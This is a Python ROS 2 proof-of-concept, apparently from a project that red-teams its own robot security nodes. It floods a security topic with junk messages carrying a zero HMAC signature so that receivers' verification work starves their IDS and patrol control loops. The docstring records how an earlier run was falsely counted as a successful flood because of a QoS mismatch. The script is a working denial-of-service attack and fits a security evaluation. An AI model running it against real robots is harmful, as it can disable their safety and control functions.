#!/usr/bin/env python3
"""攻擊 N20 — Unauthenticated message flood → 強迫每個 receiver 做 per-message HMAC verify.

N15 修補加了「reject log throttle」防 log storm，但**只 throttle 了 log，沒 throttle verify**。
patrol / IDS / mission / system / burger_env 對 /security/alerts、/security/heartbeat
上**每一筆**訊息都會跑 verify_alert（JSON double-parse + HMAC-SHA256），不論最後拒不拒。

→ 攻擊者用單一高速 publisher 灌 junk，receiver 的 single-threaded executor 被
   verify 工作佔滿 → 其他 callback（IDS 的 _evaluate / patrol 的 control loop）被餓死。

本 PoC：對目標 topic 用最高速率 publish junk String。
victim 健康度由外部觀察（IDS 的 _print_stats 5s cadence 是否被拉長）。

## ⚠️ 2026-09-15：這支曾經送出 1,223 萬筆訊息而一個都沒有離開行程

2026-09-02 的候選 smoke 用 `be`（BEST_EFFORT）跑，而防守端的
`/security/heartbeat` 是 RELIABLE。DDS 自己把話講得很清楚：

    New subscription discovered on topic '/security/heartbeat',
    requesting incompatible QoS. **No messages will be sent to it.**
    Last incompatible policy: RELIABILITY

而本腳本當時只數自己呼叫了幾次 `publish()`，於是回報
「12231436 筆 / 25.0s = 489257 msg/s」——**看起來是一場成功的洪水**。
封包擷取的事實是：那一場 3,390 個封包，正常場次 3,375。**多了 15 個。**

後果不只是一次白跑：證據排他性 gate 就是在那份資料上判定
`verify_flood` 與另外兩支「彼此不可分」的，而那個判定寫進了
「至少 4 類在目前的觀測層結構上做不到」。**判定是在攻擊從未送達的情況下做的。**

這是本專案第七次出現同一個形態（N1 的 QoS 不相容、8,192 點 scan 在傳輸層被丟、
marker 全檔掃描、FastCDR discovery、wait_for 被刪、發送端字彙表缺一項）：
**「攻擊沒送到」與「防禦擋下了」在資料上長得一模一樣。**

所以修的不是預設值，是**讓這種情況不可能安靜發生**：flood 之前必須先確認
至少有一個 QoS 相容的訂閱者配對上，沒有就以非零碼結束。
`get_subscription_count()` 只算**配對成功**的訂閱者，QoS 不相容的不算——
正好是需要的判準。
"""
import sys
import time

import rclpy
from rclpy.node import Node
from rclpy.qos import DurabilityPolicy, QoSProfile, ReliabilityPolicy
from std_msgs.msg import String

DISCOVERY_TIMEOUT_SEC = 8.0


def wait_for_matched_subscriber(node, publisher, timeout_sec=DISCOVERY_TIMEOUT_SEC):
    """等到至少一個 QoS 相容的訂閱者配對上，回傳配對數。

    `get_subscription_count()` 只算**配對成功**的訂閱者。QoS 不相容的訂閱者
    會被 DDS 發現但不會配對，所以這個計數正好把「對方在但收不到」與
    「對方根本不在」都算成 0——兩者都代表這次攻擊不會送達。
    """
    deadline = time.monotonic() + timeout_sec
    while time.monotonic() < deadline:
        matched = publisher.get_subscription_count()
        if matched > 0:
            return matched
        rclpy.spin_once(node, timeout_sec=0.1)
    return publisher.get_subscription_count()


def main():
    topic = sys.argv[1] if len(sys.argv) > 1 else '/security/heartbeat'
    duration = float(sys.argv[2]) if len(sys.argv) > 2 else 20.0
    rel = (sys.argv[3] if len(sys.argv) > 3 else 'be').lower()
    dur = (sys.argv[4] if len(sys.argv) > 4 else 'volatile').lower()

    rclpy.init()
    node = Node('attacker_verify_flood')
    reliability = (ReliabilityPolicy.RELIABLE if rel == 'reliable'
                   else ReliabilityPolicy.BEST_EFFORT)
    # ⚠️ QoS 相容有**兩個**軸，兩個都要對。2026-09-15 第一次重跑只修了
    # reliability，結果仍然 rc=2——防守端的 `/security/heartbeat` 是
    # RELIABLE **＋ TRANSIENT_LOCAL**（`intelligent_defense_node.py:158`），
    # 而 VOLATILE writer 一樣配不上 TRANSIENT_LOCAL reader。
    durability = (DurabilityPolicy.TRANSIENT_LOCAL if dur == 'transient_local'
                  else DurabilityPolicy.VOLATILE)
    qos = QoSProfile(depth=10, reliability=reliability, durability=durability)
    pub = node.create_publisher(String, topic, qos)
    print(f'   QoS = {reliability.name} / {durability.name}', flush=True)

    matched = wait_for_matched_subscriber(node, pub)
    if matched == 0:
        print(f'⛔ {topic} 上沒有任何 QoS 相容的訂閱者配對（等了 '
              f'{DISCOVERY_TIMEOUT_SEC:.0f} 秒）。這次攻擊不會送達，不執行。\n'
              f'   目前宣告 {reliability.name} / {durability.name}。'
              f'相容性有兩個軸，兩個都要對：\n'
              f'   第三個參數 reliability（be／reliable）、'
              f'第四個參數 durability（volatile／transient_local）。\n'
              f'   防守端的 /security/heartbeat 是 RELIABLE + TRANSIENT_LOCAL。',
              file=sys.stderr, flush=True)
        node.destroy_node()
        rclpy.shutdown()
        return 2
    print(f'   已配對訂閱者 = {matched}', flush=True)

    # 看似合法的 envelope 形狀（讓 verify 走完整 JSON parse + HMAC 路徑才失敗）
    junk = String()
    junk.data = ('{"body": "{\\"channel\\": \\"heartbeat\\", \\"nonce\\": '
                 '\\"deadbeefdeadbeef\\", \\"payload\\": \\"hb|0\\", \\"ts\\": 0.0}", '
                 '"sig": "0000000000000000000000000000000000000000000000000000000000000000"}')

    print(f'🌊 N20: 最高速率灌 junk 到 {topic} {duration:.0f}s', flush=True)
    n = 0
    t0 = time.monotonic()
    deadline = t0 + duration
    while time.monotonic() < deadline:
        pub.publish(junk)
        n += 1
        # 每 5000 筆 yield 一下避免完全卡死自己
        if n % 5000 == 0:
            rclpy.spin_once(node, timeout_sec=0.0)
    elapsed = time.monotonic() - t0
    final_matched = pub.get_subscription_count()
    print(f'⏹ 結束：{n} 筆 / {elapsed:.1f}s = {n/elapsed:.0f} msg/s'
          f'（配對訂閱者 {matched} → {final_matched}）', flush=True)
    if final_matched == 0:
        print('⚠️ 收尾時已無配對訂閱者——後半段可能沒有送達。',
              file=sys.stderr, flush=True)
    node.destroy_node()
    rclpy.shutdown()
    return 0


if __name__ == '__main__':
    sys.exit(main())
